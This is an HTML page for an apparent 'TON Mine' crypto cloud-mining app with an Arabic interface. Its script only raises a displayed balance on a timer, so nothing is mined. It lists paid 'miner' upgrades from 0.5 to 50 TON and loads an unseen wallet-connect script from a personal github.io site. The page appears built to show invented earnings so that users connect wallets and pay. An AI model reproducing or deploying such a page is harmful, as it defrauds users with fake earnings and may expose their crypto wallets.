<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TON Mine</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0f1d2b;
      font-family: Arial, sans-serif;
      color: #00f5ff;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      background: #091520;
      border-bottom: 1px solid #00f5ff33;
    }

    .top-bar .title {
      font-size: 18px;
      display: flex;
      align-items: center;
    }

    .top-bar .balance {
      background: #111f2e;
      padding: 5px 10px;
      border-radius: 5px;
      font-weight: bold;
    }

    .settings {
      position: absolute;
      top: 50px;
      right: 10px;
      background: #111f2e;
      border: 1px solid #00f5ff33;
      padding: 10px;
      display: none;
      flex-direction: column;
      gap: 10px;
    }

    .settings.show {
      display: flex;
    }

    .main {
      padding: 20px;
    }

    .progress-box {
      background: #111f2e;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
    }

    .progress-box h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    .progress-box .amount {
      font-size: 24px;
      margin-bottom: 10px;
    }

    .progress-box .speed-label {
      font-size: 14px;
      color: #aaa;
      margin-top: 8px;
    }

    button {
      padding: 10px 20px;
      background-color: #00f5ff;
      border: none;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 10px;
    }

    .miner-section {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
      gap: 10px;
      margin-top: 20px;
    }

    .miner-item {
      background: #1a2b3c;
      padding: 10px;
      border-radius: 10px;
      text-align: center;
      font-size: 12px;
    }

    #ton-connect {
      margin-top: 20px;
      display: flex;
      justify-content: center;
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <div class="title">#TON Mine</div>
    <div class="balance">رصيد: <span id="totalBalance">0.00000000</span> TON</div>
    <button onclick="toggleSettings()">الإعدادات</button>
  </div>

  <div class="settings" id="settingsMenu">
    <div>معرفك: <span id="userId">TON-USER-7843</span></div>
    <div>
      اللغة:
      <select>
        <option>العربية</option>
        <option>English</option>
        <option>Français</option>
        <option>Español</option>
        <option>中文</option>
        <option>Русский</option>
      </select>
    </div>
  </div>

  <div class="main">
    <div class="progress-box">
      <h2>رصيدك المؤقت</h2>
      <div class="amount" id="currentAmount">0.000000000</div>
      <button onclick="claimAmount()">استلام</button>
      <div class="speed-label">زيادة السرعة 👇</div>
    </div>

    <!-- زر ربط المحفظة -->
    <div id="ton-connect"></div>

    <div class="miner-section">
      <div class="miner-item">0/1<br>0.5 TON</div>
      <div class="miner-item">0/1<br>0.5 TON</div>
      <div class="miner-item">0/1<br>0.5 TON</div>
      <div class="miner-item">0/1<br>0.5 TON</div>
      <div class="miner-item">0/1<br>1 TON</div>
      <div class="miner-item">0/1<br>1 TON</div>
      <div class="miner-item">0/1<br>1 TON</div>
      <div class="miner-item">0/1<br>1 TON</div>
      <div class="miner-item">0/1<br>5 TON</div>
      <div class="miner-item">0/1<br>5 TON</div>
      <div class="miner-item">0/1<br>5 TON</div>
      <div class="miner-item">0/1<br>5 TON</div>
      <div class="miner-item">0/1<br>10 TON</div>
      <div class="miner-item">0/1<br>10 TON</div>
      <div class="miner-item">0/1<br>10 TON</div>
      <div class="miner-item">0/1<br>50 TON</div>
      <div class="miner-item">0/1<br>50 TON</div>
      <div class="miner-item">0/1<br>50 TON</div>
    </div>
  </div>

  <!-- مكتبة TonConnect UI -->
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

  <!-- سكربت الاتصال من مستودعك -->
  <script src="https://asalft.github.io/Asal/wallet-connect.js"></script>

  <script>
    let current = 0;
    let total = 0;

    function toggleSettings() {
      document.getElementById('settingsMenu').classList.toggle('show');
    }

    function formatTON(val) {
      return val.toFixed(9);
    }

    function updateDisplay() {
      document.getElementById('currentAmount').innerText = formatTON(current);
    }

    function claimAmount() {
      total += current;
      current = 0;
      document.getElementById('totalBalance').innerText = total.toFixed(8);
      updateDisplay();
    }

    setInterval(() => {
      current += 0.0000001;
      updateDisplay();
    }, 50);
  </script>
</body>
</html>
